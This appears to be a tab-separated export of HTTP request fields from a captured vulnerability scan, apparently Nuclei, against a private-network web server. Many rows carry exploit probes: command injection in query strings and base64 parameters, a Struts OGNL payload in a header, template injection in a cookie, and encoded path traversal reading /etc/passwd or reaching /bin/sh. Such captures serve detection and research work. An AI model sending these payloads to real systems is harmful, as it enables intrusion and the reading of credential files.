http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ReportServer/Pages/ReportViewer.aspx		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36				/web/ReportServer/Pages/ReportViewer.aspx
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/mainfile.php?username=test&password=testpoc&_login=1&Logon=%27%3Becho%20md5(TestPoc)%3B%27
*/*	gzip	en															close		588	588							192.168.1.104															1	http://192.168.1.104/web/node/1?_format=hal_json		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/node/1?_format=hal_json
	gzip																close		154	154	application/json						192.168.1.104															1	http://192.168.1.104/web/run		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/run
*/*	gzip	en															close		8004	8004	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2309.372 Safari/537.36				/web/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData
	gzip																close		252	252	multipart/form-data; boundary=--------------------------835846770881083140190633						192.168.1.104															1	http://192.168.1.104/web/index.php?s=/home/page/uploadImg		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 4.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36				/web/index.php?s=/home/page/uploadImg
	gzip																close		106	106	application/x-www-form-urlencoded;charset=UTF-8						192.168.1.104															1	http://192.168.1.104/web/guest_auth/guestIsUp.php		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/guest_auth/guestIsUp.php
text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8	gzip																close		73	73	application/x-www-form-urlencoded						192.168.1.104														http://192.168.1.104/web	1	http://192.168.1.104/web/password_change.cgi		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/password_change.cgi
																											192.168.1.104															1	http://192.168.1.104/web/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd		GET				HTTP/1.1																							/web/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
*/*	gzip	en															close		72	72	application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/index.php?s=captcha		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36				/web/index.php?s=captcha
application/json, text/javascript, */*; q=0.01	gzip																close		265	265	multipart/form-data; boundary=---------------------------5825462663702204104870787337						192.168.1.104															1	http://192.168.1.104/web/dashboard/uploadID.php		POST				HTTP/1.1																			Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36				/web/dashboard/uploadID.php
*/*	gzip	en															close		51	51							192.168.1.104															1	http://192.168.1.104/web/(download)/tmp/poc.txt		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2224.3 Safari/537.36				/web/(download)/tmp/poc.txt
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36			CSRF-TOKEN=rnqvt{{shell_exec('cat /etc/passwd')}}to5gw; simcify=uv82sg0jj2oqa0kkr2virls4dl	/web
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/tests/support/stores/test_grid_filter.php?query=phpinfo();		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.4; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/tests/support/stores/test_grid_filter.php?query=phpinfo();
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/web.config.i18n.ashx?l=nuclei&v=nuclei		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2225.0 Safari/537.36				/web/web.config.i18n.ashx?l=nuclei&v=nuclei
	gzip, deflate																close		292	292	multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83						192.168.1.104															1	http://192.168.1.104/web/servlet/UploadServlet		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2226.0 Safari/537.36				/web/servlet/UploadServlet
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/card_scan.php?No=30&ReaderNo=%60cat%20/etc/passwd%20%3E%20nuclei.txt%60
	gzip																close		7256	7256	application/json						192.168.1.104															1	http://192.168.1.104/web/service/extdirect		POST				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/service/extdirect
image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*	gzip																close				%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Hacker','Bounty Plz')}.multipart/form-data						192.168.1.104															1	http://192.168.1.104/web/		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36				/web/
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/ucmdb-api/connect		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36				/web/ucmdb-api/connect
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/test.txt		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36				/web/test.txt
																					application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh		POST				HTTP/1.1																							/web/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
	gzip																close										192.168.1.104															1	http://192.168.1.104/web/solr/admin/cores?wt=json		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36				/web/solr/admin/cores?wt=json
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/getImage.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=png		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36				/web/objects/getImage.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=png
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/index.php?s=/index/index/name/$%7B@phpinfo()%7D		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2866.71 Safari/537.36				/web/index.php?s=/index/index/name/$%7B@phpinfo()%7D
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/getImageMP4.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.1 Safari/537.36				/web/objects/getImageMP4.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg
*/*	gzip	en															close										192.168.1.104															1	http://192.168.1.104/web/secure/ContactAdministrators!default.jspa		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/secure/ContactAdministrators!default.jspa
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/getSpiritsFromVideo.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg		GET				HTTP/1.1																			Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.2117.157 Safari/537.36				/web/objects/getSpiritsFromVideo.php?base64Url=YGlkID4gbnVjbGVpLnR4dGA=&format=jpg
*/*	gzip	en															close				application/x-www-form-urlencoded						192.168.1.104															1	http://192.168.1.104/web/objects/nuclei.txt		GET				HTTP/1.1																			Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36				/web/objects/nuclei.txt
